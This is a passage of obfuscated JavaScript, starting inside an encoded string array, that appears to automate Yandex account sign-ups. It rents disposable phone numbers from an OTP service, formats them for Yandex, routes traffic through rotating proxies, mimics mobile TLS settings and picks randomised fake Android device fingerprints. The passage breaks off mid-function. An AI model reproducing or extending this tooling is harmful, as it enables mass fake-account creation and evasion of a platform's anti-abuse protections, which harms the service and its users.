'zxj2zq', 'u2f2zq', 'mJuZ', 'vxnLCG', 'cIaG4Pwu', 'tgfhAW', 'mJKX', 'D29YAW', 'CYbRzq', 'venIAW', 'A1vjwq', 'icaG4PwA', 'tLHyDG', 'mtqUma', 'ywnOAq', 'ihj1lG', 'mtCYmq', 'rM9XwG', 'CM95', 'CNjvrq', 'yxr6Cq', 'vNnHAW', 'thrczG', 'EM9qCW', 'qvjfxa', 'CMvZCW', 'mI9Nzq', 'r0nnxW', 'DxrMoa', 'B3jPzW', 'Ew5J', 'rg9Uzq', 'r1nHDq', 'ywrHyq', 'qMT2uG', 'mJiPoG', 'Cu5vqW', 'icHUDq', 'z195yq', 'uujYra', 'vhjeCG', 'rufurq', 'BMvK', 'otK0', 'AgfIBa', 'Aw5Lza', 'wL8Kxq', 'zhftzW', 'BfzpuG', 'qwrKia', 'sxz5va', 'zerlEa', 'mc05yq', 'mJy3', 'ueTQBG', '4Pwu4PAi4PAi4Pwx', 'zwv6yW', 'y29UBG', 'ntKX', 'D2vYqW', 'yw53CW', 'yM9Sza', 'yMfUBG', 'uYXLBG', 'yw5Kzq', 'icdILze', 'C2v0uG', 'zgvZDa', 'otC1', 'sK1gtW', 'ywnL', 'yw5Jzq', 'iokvMUkvKokvNq', 'u2vUDa', 'CY1WCG', 'AsboBW', 'yxDnBW', 'zxHLyW', 'CKfmqW', 'ywnRlW', 'BwvZCW', 'DLD1uW', '4PwxiokwIokwIa', 'mty0oq', 'zgDoyW', 'mc42nW', 'Aw5N', 'CKXZra', 'C2v0sq', 'CgXHDa', 'wuHiDa', 'BwfPBG', 'zcbRzq', 'DxjYzq', 'rMfPBa', 'Exv3Eq', 'ls0ktq', 'uMLNAa', 'C2HLBa', 'ntK4', 'DvHPqq', 'shffza', 'DMvKia', 'AwXLza', 'BwLU', 'v3jPCW', 'EMT0CW', 'keXPBG', 'Dg9Via', 'BwvUDa', 'x2zVCG', 'lI4k', 'CMDSyq', 'AxjZDa', 'yMvY', 'tM9qCG', 'DhnryG', 'tfjKEq', 'r2LRvq', 'ns44nG', 'vJiXma', 'mJqI', 'r2HTwG', 'zguUAG', 'q2LTsq', 'AxvqqG', 'ntK3', 'AhzyqG', 'z2H0', 'ihrOAq', 'v2DMAW', 'Du1yBq', 'zMrJCq', 'DxPirW', 'uefeEa', 'twfAAa', 'yxvHwG', 'svffqW', 'DeHjBq', 'EMDcEa', 'vMHUBG', 'qvLHDG', 'yKn5vW', 'u2vSzq', 'w1nfva', 'q0HbqW', 'rMH4DG', 'tK51sa', 'DxnL', 'vMvYCW', 'mdqUoa', 'kcGOlG', 'DMzbEG', 'DKrJrq', 'sw5mAG', 'uKrxqq', 'qxLWvq', '4PAi4Pwx4PAi4PAi', 'Dg90yq', 'seeZoa', 'xYrDwW', 'qwjVCG', 'mJm1', 'EhHhEG', 'B2nLCW', 'y2vFyW', 'wxrwrq', 'yvbpEa', 'zhm6', 'icD8jW', 'rKnwwq', 'z2vYzq', 'revyxq', 'thDkAG', 'zwrKCq', 'otK4', 'x0Dpva', 'yxrPBW', 'ihLVDq', 'AxPOqW', 'jsdILiiG', 'ChvZAa', 'qw5svW', 'CfrKua', 'tNjVyG', 'wLn1sW', 'yKnVrq', 'BIbWAq', 'tLPytG', 'AxjLza', 'ihzHBa', 'te5wuG', 'mJi4', 'v0Lgsq', 'ws0Tlq', 'C3rVBq', 'DNjjsa', 'mtaGva', 'uIbttW', 'twfRzq', 'zhmGka', 'BLbstW', 'ywDLlW', 'FdD8mq', 'Fe9uua', 'C2fMAW', 'ks4Grq', 'yuT2Da', 'u3vJyW', 'rvHbia', 'ExvkqG', '4PAi4PAi4Pwx4PAi', 'zM9YxW', 'quDVBG', 'Aez4tq', 'rvGGrW', 'mtq5lG', 'rxjYoG', 'zLLnBa', 'y1jcra', 'zcb0Aa', 'sKf5sa', 'D1zeAW', 'CMv0Dq', 'ywWSCa', 'mtq4lG', 'reL6Bq', 'zxiGmG', 'BM9Yzq', 'rwXMwG', 'BefTvq', 'u0nsqq', 'Aw5JBa', 'qKPltW', 'uKjfEa', 'z2vYlq', 'AwTguq', 'mtm0ma', 'ywrZ', 'mY9Nzq', 'DMLwAa', 'CMvyta', 'A2zuCW', 'CZu6lW', 'zwn0zq', 'u2fVvW', 's3vYEG', 'k0zUnW', 'ucblzq', 'CM9Wzq', 'DcbSzq', 'B2TcCG', 'BMCUlG', 'ihjLCW', 'D09Utq', 'mZC2', 'y2vjra', 't1f1uG', 'A2vLCa', 'mtGWoq', 'yxjKDW', 'mti2oa', 'mJu2xW', 'DKHHDq', 'D21xuG', 'ALnbCG', 'u2DeCG', 'A2nzvG', 'EvDezq', 'psaOrW', 'odu2', 'vKnuEa', 'z2f0zq', 'mZCX', 'jg1Iia', 'DvLcCW', 't1zfra', 'zgrsDq', 'mJiX', 'ue5pAW', 'uhHvzq', 'ie5LDa', 'wgLHBW', 'ifbvqG', 'rwL2zG', 'DcbMBW', 't2DgCW', 's21SBq', 'u2fTCW', 'zsKUtq', 't1Dorq', 's1eXlG', 'AfHkqW', 'C3rYAq', 'ibTBoq', 'yxnL', 'DLf0BW', 'Cg9YDa', 'yMvYCW', 'suv0wa', 'zLfHwG', 'zguGyq', 'ms4WlG', 'ihrYEq', 't0XYra', 'nJG1', 'ChDmrG', 'x2r1Bq', 'DxmGia', 'ica6ia', 'uurTwa', 'v3LjAG', 'rvnxBq', 'D3rysG', 'shnQra', 'zxHPCW', 'l2fWAq', 'khj1BG', 'vxnLia', 'BgLAEG', 'DLntva', 'A2PItq', 'uKLArq', 'vMLHCW', 'DhjPBG', 'Dgv4Da', 'EujTtW', 'uvfRyW', 'CMvTzq', 'B1jsuG', 'ls0Tlq', 'A2LUDa', 'B25Uzq', 'y0HIzG', 'y3LxyW', 'u1fZzq', 'rKH5tq', 'BMrgAq', 'CMv0CG', 'zw4GBa', 'tK9nAG', 'CuvKEa', 'zxjZlG', 'DhjHBG', 'C2fizW', 'i0zgnG', 'v0jHvq', 'tKjysW', 'g1SZsG', 'AgnxCG', 'ywrLza', 'zg9mEG', 'AvjsuG', 'drTBsW', 'zxrFzq', 'CfjPyG', 'kJTXpq', 'A01hra', 'nJCZ', 'otK2', 'rLDAvW', 'uxrYwq', 'Aw5WDq', 'z0fNvW', 'AevwvW', '4PwDicdILOG', 'Bwf4', 'yKj1Ca', 's2zACG', 'mJaWmq', 'r0Dtuq', 've9pta', 'zf9WCG', 'mJq0', 'mZC0', 'tMnzyq', 'BhPKvG', 'ru1nDW', 'u00Tqq', 'wMTnua', 'Aejfsq', 'wwrorG', 'EhjXzG', 'wNnSwa', 'ieLUDG', 'BMv3', 'Ec1JCW', 'lxPblq', 'BcbODa', 'BgfIAq', 'vKjmBq', 'AMPWsa', 'u0jZwG', 'DhvZia', 'BhzL', 'BgLKia', 'lJeY', 'rwD5AG', 'rfbXyq', 'BI94Aa', 'Dg9gAq', 'mZGY', 'seTkCW', 'DwfStW', 'BuLVua', 'rLj1DG', 'C1bcBq', 'ihT9', 'DfrwCa', 'v2LUza', 'ELrxrW', 'mJq4', 'CML0', 'mZjFta', 'u3rYAq', 'mJq5mG', 's19duG', 'mJeZ', 'BNnLoG', 'nJCW', 'ntaZ', 'luDdtq', '4Pwr4PAi4PAi4Pwu', 'zY4Goa', 'Es1HzW', 'q0nkwq', 'z2HJsG', 'A0jjwa', 'rhPkCG', 'zMfPAa', 'z21pvW', 'DMuGyG', 'sK5prW', 'zxnZzq', 'nv9tsa', 'q1f5CG', 'BcbuAq', 'Bg9N', 'A0PVuq', 'EKeTwG', 'q2PdrG', 'DxG7ia', 'mJmY', 'sK1mCa', 'BMv4yq', 'DwX0kq', 'C3vJyW', 'A1fwza', 'Ag9ZDa', 'AhH0Ca', 'z3jHBq', 'B24G', 'DLnJzG', 'Aw9UlW', 'Dhj5', 'BcbLCG', 'rMLSzq', 'ifTKzq', 'C3vICW', 'CM9Syq', 'qwjWua', 'ufzetW', 'jgnWDq', 'ihvZzq', 'Ahr0Ca', '4Pwr4PAi4PAi4PAi', 'BwL1Bq', 'C2v0Dq', 'mZz0A21vDfi', 'vujIuG', 'y3jHCa', 'ifLbtG', 'wvHmtW', '4Pwq4Pwq4Pwq4PwJ', 'ywXRqa', 'mI43nq', 'vf9gqq', 'B0DIrW', 'Cg9hsa', 'zLLMua', '4Pwx4PAi4PAi4Pwu', 'q2HYBW', 'Bcbtzq', 'AwvZ', 'mZG1', 'A2v5Ca', 'w+kaOL0G', 'wKz2sG', 'tw96Aq', 'yxzLza', 'AhrTBa', 'uKXpyW', 'zgv4Fa', 'lcaQlW', 'mxWZFa', 'zM9Yrq', 'C2vJlq', 'iokwIokwIokvKq', 'CYbPCW', 'wNDWrW', 'DxvPza', 'odG2', 'mZC4', '4PAi4Pwu4PwD4PAi', 'Bfn2BW', 'C3vIBq', 'rxHmDW', 'r3DPyq', 'AxmGyW', 'sgfYza', '8j+tGsbmBW', 'zNvUyW', 'Dc9ZDq', 'qMPYuq', 'Aw5ZDa', 'w1LbtG', 'mtm0nq', 'mty2na', 'ChjVza', 'zwqGCa', 'rM5wEG', '4PYtifnH', 'ChrPBW', 'mJKW', 'twT0yG', 'AxHHDG', 'zxDYCq', 'DgLVBG', 'mJa2mdjftgvpsMG', 'mJK3', 'AMjdqq', 'qLLwzG', '4Pwx4PAi4PAi4Pwx', 'mtm3lG', 'yxrOia', 'Dgviyq', 'AwvZlG', 'Aw5NlG', 'q1bimG', 'qLjLzq', 'sLfJBG', 'y29UDa', 'ywXSAq', 'zw5K', 'vhLfuG', 'zM9isW', 't21Mta', 'x2XVzW', 'C3PNyq', '4Pwq4Pwq4Pwq4Pwx', 'yxv0BG', 'zwnRxW', 'CxL0Da', 'qvr2qW', 'wMzzsW', 'DMfSAq', 'igzVDq', 'wgPjzG', 'DgfJDa', 'BxztCq', 'zgLNzq', 've9Nsa', 'ywqGzG', 'BuX1Da', 'vg90yq', 'x0nsrq', 'BgLUzq', 'ksKUlG', 'vw9PsW', 'icbzqq', 'C3rHBq', 'B25ZDa', 'ueP1yW', 'sK1SCG', 'rcaGia', 'zMP1ua', 'BgvUzW', 'ifnLCG', 'Ag5kDW', 'icaGoG', 'CMPWtG', 'mdi7ia', 'lNr4Da', 'rs1suW', 'Dvn0Dq', 'BgLK', 'AxrPBG', 'DNfLBW', 'AwXL', 'CKffEG', 'DhjHyW', 'te5kvG', 'C2HHmq', 'qLv2BW', 'Dg9Y', 'C2LNBG', 'BNruqq', 'vML2BW', 'vffpvq', 'zwqUDa', 'oIbnAq', 'zunrAq', 'wvjkuG', 'ywnO', 'r2v0lq', 'x2fSBa', 'EefrAG', 'icGVCa', 'teTHzG', 'Dc9JBW', 'Ag5QvG', '4PAi4PAi4PAi4Pwu', 'vvbDia', 'sKrWCq', 'qxrhvW', 'CNnOzq', 'BMrLzG', 'Dw5N', 'isbqBa', 'nta0', 'revyia', 'vfnhzW', 'uvzxtW', 'y3rYBa', 'CgvYqW', 't2jqwG', 'swDYzW', 'yw5KCG', 'ELjWuG', 'mZGZ', 'mNWXmq', 'zMLSDa', 'BgLTAq', 'DNHXDG', 'wK1Psq', 'DMfS', 'C3qGDa', 'icdILzRILOG', 'DgvRrW', 'runesa', 'rur4uW', 'tKrmwG', 's1nsAa', 'nJC3', 'sMTKqW', 'wezpAW', 's19jra', 'q0fqua', 'zM1SyW', 'Aw5Kzq', 'zxn0', 'ndi5kq', 'DKXSCa', 'DxnLCG', 'otK1', 'CwnoBW', 'zgf0yq', 'r1bwAa', 'z0vwyq', 'CMX4wq', 'DgvZDa', 'suW6ia', 'yxjNDG', 'ruqGlW', 'rhLtuG', 'BNrLCG', 'sMzzwG', 'sMDJsq', 'lujfrW', 'ieLelG', 'whDIyG', 'BMLssa', 'mJm0', 'DMuGCW', 'CeDnCW', 'u1HTBW', 'Aw5Nia', 'BMCUia', 'DdOGBG', 'zg5fuq', 'BMzPCG', 'sNPSqG', 'AxPQwa', 'yKLqza', 'DhvYzq', 'yu1hDG', 'yxbWBa', 'ifn0yq', 'Aw9Uia', 'D010BG', 'ifnPBa', 'A1Hytq', 'BvHLCW', 'zMfPBa', 'ns4Wia', 'wdi1nq', 'icdILzRILza', 's0vzlq', 'luvYCG', 'BMvVCa', 'C2nYAq', 'BeLRvq', 'zw5LCG', 'BMnVza', 'z3vUEG', 'yKXwqW', 'BgPNzq', 'yMfZzq', 'iIbPBG', 'AgLZiG', 'yLvfva', 'zv9UDq', 'AM9PBG', 'mtG0oq', 'Dc9JAa', 'CvbmDa', 'mc43mG', 'CgfYCW', 'vgn3vG', 'q0nVua', 'sgDhrq', 'qLnkza', 'rwPbyq', 'z3jhvW', 'CMqGlq', 'vfjjrW', '4Pwq4PwDica', 'uMvZCa', 'q2zoDq', 'icaTlq', 'CMf5Da', 'z3jHEq', 've93Ca', 'qtTcCG', 'zYbZzq', 'y3j5Ca', 'te5kBa', 'twDUuq', 'mti3rG', 'Aw5Ozq', 'rsaOna', 'DezoyG', 'BenVDq', 'swLXwG', 'C2PgEq', 'ALHesq', 'wLPLva', 'mJmX', 'mtG2oa', 'vwLcrq', 'mJy2', 'C29Yia', 'weTyCq', 'BMvhDq', 'BgqGBG', 'CMvKia', 'mJu0', 'nJKW', 'yKDgrq', 'mJm3', 'C2jNEG', 'mJGTrW', 'ns44mG', 'tKvuxW', 'BMHxEq', 'mZuZ', 'vfjbqW', 'otyY', 'zsaTqW', 'ic1fCG', 'twrvtG', 'icdILOJILOG', 's0vVEq', 'tw1hvG', 'mZu3', 'zwn0', 'shzmBG', 'B21vvq', 'x3nLBG', 'BMLUzW', 'mJq2', 'Dw5SAq', '4PAi4PAi4Pwr4PAi', 'qLL4tW', 'Bw1Zta', 'B2LKia', 'luvora', 'wLDvuW', 'veHpuG', 'mJK4', 't0fIrG', 'tNDuvq', 'CMLUzW', 'y3rPBW', 'Aw9U', 'rurRAa', 'Bgvtrq', 'mJyX', 'Bu9lCG', 'zu92tG', 'veXtxW', 'uez1AG', 'ww1SvW', 'Bgf5xW', 'rvjs', 'BNviEq', 'DMvmAq', 'swzmuq', 'C3bSAq', 'sgTTqW', 'yxbWzq', 'D1vhyG', 'zLK9cG', 'r1rnBa', 'osXPBq', 'wu1IBq', 'ieXPyW', '4PAi4Pwr4PwA4PAi', 'BxD6Bq', 'rLjNBa', 'sg93ia', '4PwD4PwA4Pwq4Pwq', 'mdaPoG', 's3fyzq', 'zwvK', 'uMvKBq', 'C2v0lq', 'x0Xjtq', 'mtC2nW', 'BMXVyq', 'mta5mtq4ndHqsMjrwvu', 'BKzODq', 'BgfUzW', 'BMvSia', 't2XyvG', 'ihnHDG', 'zMXVBW', 'yvzqCa', 'icaGgW', 'CwLHsW', 'CL9WDq', 'C2v0va', 'ihnLCG', 'DgLTzq', 'nJG3', 'icPCka', 'j0Hlta', 'l3zLCG', 'zuzPBa', 'C1zjtq', 'mJu1', 'zgv2Aq', 'DguGoq', 'yw5NDq', 'teveia', 'z0Ljqq', 'C256yq', 'DMvYAq', 'CNDZvG', 'BIbVCG', 'CMvSzq', 'Dg9tDa', 'qwrpDG', 'ksGGkq', 'zY4k', 'zM9YBq', 'zMLNDq', 'B25Lia', 'tgvUzW', 'DguGmq', 'zw50lq', 'odu1', 'u3rHDa', 'vfvqxq', 'ienVBG', 'twjcsa', 'vgHYzq', 'CMvTBW', 'zNPIuq', 'rM1kDq', 'DhLWzq', 'mJuX', 'ENjrrW', 'mZG2', 'zfbbCG', 'zw4Uia', 'zKPIwG', 'nJC4', 'DfrPBq', 'BM9ZBW', 'FdeW', 'DgvFCG', 'BM90zq', 'ifrPBq', 'zxiGka', 'r0jJua', 'vtDqyW', 'ieDpia', 'CIbUzq', 'De1HCW', 'ntK0', 'zw50Ba', 'y3jLyq', 'CIbYyq', 'zxjZAq', 'u1rfua', 'r05iqW', 'CdiVzW', 'DLbOAG', 'BwfUDq', 'ig9Uia', 'lunPBq', 'zxGUDa', 'BgfUAW', 'z2zeyG', 'mJuY', 'lJaGqW', 'DurWBa', '4PAi4PAi4PAi4PAi', 'oty4', 'uLfRCG', 'zxjZrG', 'Dun2yq', 'tuD3Eq', 'rxjYBW', 'zefmBa', 'Cgf1CW', 'q293qG', 'igTLEq', 'EKDtua', 'CNHkuW', 'D2LUmW', 'ANnVBG', 'BgzjAG', 'oIb0lG', 's25IAa', 'CNbyzW', 'rMfZDa', 'mJaZBwvLAejA', 's3nxCG', 'B3qGzW', 'DgvKlq', 'tfHnuW', 'r1DzuW', 'ALvRBW', 'qvvNuW', 'u2vYDG', 'EgXYvq', 'zxnZ', 'C0Xuta', 'DhnxAq', 'CMvHza', 'ihbYBW', 'reXWvW', 'vvritW', 'C29JAq', 'zsb8ia', 'z3jHCa', 'yKnxsa', 'B25LlW', 'ucbMBW', 'zxGSBa', 'zK1vCG', 'q1vszq', 'mZu5', 'mti2na', 'mJe4', 'icaG', 'wMXLzG', 'CgfKuW', 'D2fYzq', 't3n2Ca', 'v2Lrwa', 'CgfJAW', 'iJe0oq', 'AxrF', 'AwnLBG', 'AxbSrG', 'surWrW', 'ntaGva', 'Bwnqzq', 'y0LXDa', 'Chj3Eq', 'tfHwvq', 'zwjWDG', 'qvHKuq', 'BwjLCG', 'nZaW', 'DgHYzq', 'C2fuBa', 'mJaYndKWnvvTD01Hsa', 'v0voCq', 'BgLNAa', 'DgPHCG', 'otCW', 'su5wqq', 'BIbMAq', 'CNj3ra', 'uhb1Dq', 'mti4na', 'l3bHCW', 'BxDJvq', 'DcbJAa', 'q3vZDa', 'CxzPvG', 'u0rwsW', 'q0nfuW', 't29nrq', 'vhvzva'];
  fn1 = function () {
    return v24;
  };
  return fn1();
}
const nexaLimiter = new NexaRateLimiter(500);
function nexaFetchNumber(v25, v26, v27) {
  return new Promise((v28, v29) => {
    {
      const v30 = {};
      v30.range = v26, v30.format = "normal";
      const v31 = JSON.stringify(v30),
        v32 = {
          'hostname': "nexaotpservice.com",
          'port': 0x50,
          'path': v27 || "/api/v1/numbers/get",
          'method': "POST",
          'headers': {
            'X-API-Key': v25,
            'Content-Type': "application/json",
            'Content-Length': Buffer.byteLength(v31)
          }
        },
        v33 = http.request(v32, v34 => {
          let v35 = '';
          v34.on("data", v36 => v35 += v36);
          v34.on("end", () => {
            try {
              const v37 = JSON.parse(v35);
              if (v37.success && v37.number) v28(v37.number.replace(/[^0-9]/g, ''));else v29(new Error(v37.error || "NexaOTP: No number returned"));
            } catch (v38) {
              v29(new Error("NexaOTP: Invalid response"));
            }
          });
        });
      v33.on("error", v39 => v29(new Error("NexaOTP network: " + v39.message))), v33.setTimeout(10000, () => {
        v33.destroy(), v29(new Error("NexaOTP: Timeout"));
      }), v33.write(v31), v33.end();
    }
  });
}
const DIAL_MAP = [["1242", 'bs'], ["1246", 'bb'], ["1264", 'ai'], ["1268", 'ag'], ["1284", 'vg'], ["1340", 'vi'], ["1345", 'ky'], ["1441", 'bm'], ["1473", 'gd'], ["1649", 'tc'], ["1664", 'ms'], ["1670", 'mp'], ["1671", 'gu'], ["1721", 'sx'], ["1758", 'lc'], ["1767", 'dm'], ["1784", 'vc'], ["1787", 'pr'], ["1809", 'do'], ["1829", 'do'], ["1849", 'do'], ["1868", 'tt'], ["1869", 'kn'], ["1876", 'jm'], ["1939", 'pr'], ["211", 'ss'], ["212", 'ma'], ["213", 'dz'], ["216", 'tn'], ["218", 'ly'], ["220", 'gm'], ["221", 'sn'], ["222", 'mr'], ["223", 'ml'], ["224", 'gn'], ["225", 'ci'], ["226", 'bf'], ["227", 'ne'], ["228", 'tg'], ["229", 'bj'], ["230", 'mu'], ["231", 'lr'], ["232", 'sl'], ["233", 'gh'], ["234", 'ng'], ["235", 'td'], ["236", 'cf'], ["237", 'cm'], ["238", 'cv'], ["239", 'st'], ["240", 'gq'], ["241", 'ga'], ["242", 'cg'], ["243", 'cd'], ["244", 'ao'], ["245", 'gw'], ["246", 'io'], ["248", 'sc'], ["249", 'sd'], ["250", 'rw'], ["251", 'et'], ["252", 'so'], ["253", 'dj'], ["254", 'ke'], ["255", 'tz'], ["256", 'ug'], ["257", 'bi'], ["258", 'mz'], ["260", 'zm'], ["261", 'mg'], ["262", 're'], ["263", 'zw'], ["264", 'na'], ["265", 'mw'], ["266", 'ls'], ["267", 'bw'], ["268", 'sz'], ["269", 'km'], ["290", 'sh'], ["291", 'er'], ["297", 'aw'], ["298", 'fo'], ["299", 'gl'], ["350", 'gi'], ["351", 'pt'], ["352", 'lu'], ["353", 'ie'], ["354", 'is'], ["355", 'al'], ["356", 'mt'], ["357", 'cy'], ["358", 'fi'], ["359", 'bg'], ["370", 'lt'], ["371", 'lv'], ["372", 'ee'], ["373", 'md'], ["374", 'am'], ["375", 'by'], ["376", 'ad'], ["377", 'mc'], ["378", 'sm'], ["380", 'ua'], ["381", 'rs'], ["382", 'me'], ["383", 'xk'], ["385", 'hr'], ["386", 'si'], ["387", 'ba'], ["389", 'mk'], ["420", 'cz'], ["421", 'sk'], ["423", 'li'], ["500", 'fk'], ["501", 'bz'], ["502", 'gt'], ["503", 'sv'], ["504", 'hn'], ["505", 'ni'], ["506", 'cr'], ["507", 'pa'], ["508", 'pm'], ["509", 'ht'], ["590", 'gp'], ["591", 'bo'], ["592", 'gy'], ["593", 'ec'], ["594", 'gf'], ["595", 'py'], ["596", 'mq'], ["597", 'sr'], ["598", 'uy'], ["599", 'cw'], ["670", 'tl'], ["672", 'nf'], ["673", 'bn'], ["674", 'nr'], ["675", 'pg'], ["676", 'to'], ["677", 'sb'], ["678", 'vu'], ["679", 'fj'], ["680", 'pw'], ["681", 'wf'], ["682", 'ck'], ["683", 'nu'], ["685", 'ws'], ["686", 'ki'], ["687", 'nc'], ["688", 'tv'], ["689", 'pf'], ["690", 'tk'], ["691", 'fm'], ["692", 'mh'], ["850", 'kp'], ["852", 'hk'], ["853", 'mo'], ["855", 'kh'], ["856", 'la'], ["880", 'bd'], ["886", 'tw'], ["960", 'mv'], ["961", 'lb'], ["962", 'jo'], ["963", 'sy'], ["964", 'iq'], ["965", 'kw'], ["966", 'sa'], ["967", 'ye'], ["968", 'om'], ["970", 'ps'], ["971", 'ae'], ["972", 'il'], ["973", 'bh'], ["974", 'qa'], ["975", 'bt'], ["976", 'mn'], ["977", 'np'], ["992", 'tj'], ["993", 'tm'], ["994", 'az'], ["995", 'ge'], ["996", 'kg'], ["998", 'uz'], ["959", 'mm'], ['20', 'eg'], ['27', 'za'], ['30', 'gr'], ['31', 'nl'], ['32', 'be'], ['33', 'fr'], ['34', 'es'], ['36', 'hu'], ['39', 'it'], ['40', 'ro'], ['41', 'ch'], ['43', 'at'], ['44', 'gb'], ['45', 'dk'], ['46', 'se'], ['47', 'no'], ['48', 'pl'], ['49', 'de'], ['51', 'pe'], ['52', 'mx'], ['53', 'cu'], ['54', 'ar'], ['55', 'br'], ['56', 'cl'], ['57', 'co'], ['58', 've'], ['60', 'my'], ['61', 'au'], ['62', 'id'], ['63', 'ph'], ['64', 'nz'], ['65', 'sg'], ['66', 'th'], ['81', 'jp'], ['82', 'kr'], ['84', 'vn'], ['86', 'cn'], ['90', 'tr'], ['91', 'in'], ['92', 'pk'], ['93', 'af'], ['94', 'lk'], ['95', 'mm'], ['98', 'ir'], ['1', 'us'], ['7', 'ru']];
function getCountry(v40) {
  for (const [v41, v42] of DIAL_MAP) {
    if (v40.startsWith(v41)) {
      {
        if (v41 === '7' && (v40.startsWith('77') || v40.startsWith('76'))) return 'kz';
        return v42;
      }
    }
  }
  return 'us';
}
function formatPhoneForYandex(v43) {
  const v44 = v43.replace(/[^0-9]/g, ''),
    v45 = getCountry(v44);
  let v46 = '';
  for (const [v51] of DIAL_MAP) {
    if (v44.startsWith(v51)) {
      {
        v46 = v51;
        break;
      }
    }
  }
  const v47 = v44.slice(v46.length);
  let v48 = '+' + v46;
  if (v47.length >= 2) {
    v48 += '\x20(' + v47.slice(0, 2) + ')\x20';
    const v52 = v47.slice(2);
    v48 += v52.match(/.{1,3}/g).join('\x20');
  } else v48 += '\x20' + v47;
  const v49 = ('+' + '0'.repeat(v46.length) + '\x20(' + '0'.repeat(Math.min(2, v47.length)) + ')\x20' + '0'.repeat(Math.max(0, v47.length - 5)) + '\x20' + '0'.repeat(Math.min(5, v47.length))).trim(),
    v50 = '+' + '0'.repeat(v46.length);
  return {
    'phone_number': v48.trim(),
    'country': v45,
    'dialCode': '+' + v46,
    'mask': v49,
    'startMask': v50
  };
}
function parseProxy(v53) {
  if (!v53) return null;
  if (typeof v53 === "object") return v53;
  v53 = v53.trim();
  if (!v53) return null;
  let v54 = "http";
  if (v53.startsWith("socks5://")) v54 = "socks5", v53 = v53.slice(9);else {
    if (v53.startsWith("socks4://")) v54 = "socks4", v53 = v53.slice(9);else {
      if (v53.startsWith("http://")) v53 = v53.slice(7);else {
        if (v53.startsWith("https://")) v53 = v53.slice(8);
      }
    }
  }
  let v55, v56, v57, v58;
  if (v53.includes('@')) {
    {
      const [v60, v61] = v53.split('@');
      [v57, v58] = v60.split(':'), [v55, v56] = v61.split(':');
    }
  } else {
    {
      const v62 = v53.split(':');
      if (v62.length === 4) [v55, v56, v57, v58] = v62;else [v55, v56] = v62;
    }
  }
  v56 = parseInt(v56);
  if (!v55 || !v56 || isNaN(v56)) return null;
  const v59 = {};
  v59.type = v54;
  v59.host = v55;
  return v59.port = v56, v59.user = v57, v59.pass = v58, v59;
}
function createAgent(v63) {
  if (!v63) return null;
  const v64 = v63.user ? encodeURIComponent(v63.user) + ':' + encodeURIComponent(v63.pass || '') + '@' : '';
  if (v63.type === "socks5" || v63.type === "socks4") return new SocksProxyAgent("socks5://" + v64 + v63.host + ':' + v63.port);
  return new HttpsProxyAgent("http://" + v64 + v63.host + ':' + v63.port);
}
function request(v65, v66, v67, v68, v69, v70 = 22000) {
  return new Promise((v71, v72) => {
    const v73 = new URL(v65),
      v74 = {
        ...v67
      },
      v75 = v74;
    if (v68) v75["Content-Length"] = Buffer.byteLength(v68);
    const v76 = {
        'hostname': v73.hostname,
        'path': v73.pathname + v73.search,
        'method': v66,
        'headers': v75,
        'timeout': v70,
        'ciphers': ["TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256", "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384"].join(':'),
        'ecdhCurve': "X25519:P-256:P-384",
        'minVersion': "TLSv1.2"
      },
      v77 = v69 ? parseProxy(v69) : null;
    if (v77) {
      if (!v77.host) return v72(new Error("Invalid proxy"));
      v76.agent = createAgent(v77);
    }
    const v78 = https.request(v76, v79 => {
      const v80 = [];
      v79.on("data", v81 => v80.push(v81));
      v79.on("error", v72), v79.on("end", () => {
        {
          let v82 = Buffer.concat(v80);
          const v83 = v79.headers["content-encoding"];
          try {
            if (v83 === "gzip") v82 = zlib.gunzipSync(v82);else {
              if (v83 === "deflate") v82 = zlib.inflateSync(v82);else {
                if (v83 === 'br') v82 = zlib.brotliDecompressSync(v82);
              }
            }
          } catch (v84) {}
          v71({
            'status': v79.statusCode,
            'data': v82.toString("utf8"),
            'headers': v79.headers
          });
        }
      });
    });
    v78.on("error", v72), v78.on("timeout", () => {
      v78.destroy();
      v72(new Error("timeout"));
    });
    if (v68) v78.write(v68);
    v78.end();
  });
}
function parseCookies(v85) {
  const v86 = {};
  const v87 = Array.isArray(v85) ? v85 : v85 ? [v85] : [];
  for (const v88 of v87) {
    {
      const [v89] = v88.split(';'),
        v90 = v89.indexOf('=');
      if (v90 > 0) v86[v89.slice(0, v90).trim()] = v89.slice(v90 + 1).trim();
    }
  }
  return v86;
}
const mergeCookies = (v91, v92) => ({
    ...v91,
    ...v92
  }),
  cookieStr = v93 => Object.entries(v93).map(([v94, v95]) => v94 + '=' + v95).join(';\x20'),
  v1 = {};
v1.manufacturer = "Xiaomi", v1.model = "Redmi Note 4", v1.os = '10', v1.density = "2.625";
const v2 = {};
v2.manufacturer = "Xiaomi", v2.model = "Redmi Note 9", v2.os = '11', v2.density = "2.625";
const v3 = {};
v3.manufacturer = "Xiaomi", v3.model = "Redmi Note 10", v3.os = '12', v3.density = "2.75";
const v4 = {};
v4.manufacturer = "Samsung", v4.model = "SM-A325F", v4.os = '12', v4.density = "3.0";
const v5 = {};
v5.manufacturer = "Samsung", v5.model = "SM-A135F", v5.os = '12', v5.density = "2.625";
const v6 = {};
v6.manufacturer = "Samsung", v6.model = "SM-M127F", v6.os = '11', v6.density = "2.625";
const v7 = {};
v7.manufacturer = "Motorola", v7.model = "moto g31", v7.os = '11', v7.density = "2.5";
const v8 = {};
v8.manufacturer = "Vivo", v8.model = "V2109", v8.os = '11', v8.density = "2.5";
const v9 = {};
v9.manufacturer = "Oppo", v9.model = "CPH2185", v9.os = '11', v9.density = "2.625";
const v10 = {};
v10.manufacturer = "Realme", v10.model = "RMX3241", v10.os = '11', v10.density = "2.5";
const DEVICES = [v1, v2, v3, v4, v5, v6, v7, v8, v9, v10],
  APP_VERS = ["5.84.1", "5.83.1", "5.85.0", "5.86.0", "5.82.1"],
  SDK_VERS = ["7.51.12", "7.50.10", "7.52.0"],
  CHROME_VERS = ["149.0.7827.164", "148.0.7204.84", "147.0.6750.114"];
function makeDevice() {
  const v96 = DEVICES[Math.floor(Math.random() * DEVICES.length)],
    v97 = APP_VERS[Math.floor(Math.random() * APP_VERS.length)],
    v98 = SDK_VERS[Math.floor(Math.random() * SDK_VERS.length)],
    v99 = CHROME_VERS[Math.floor(Math.random() * CHROME_VERS.length)],
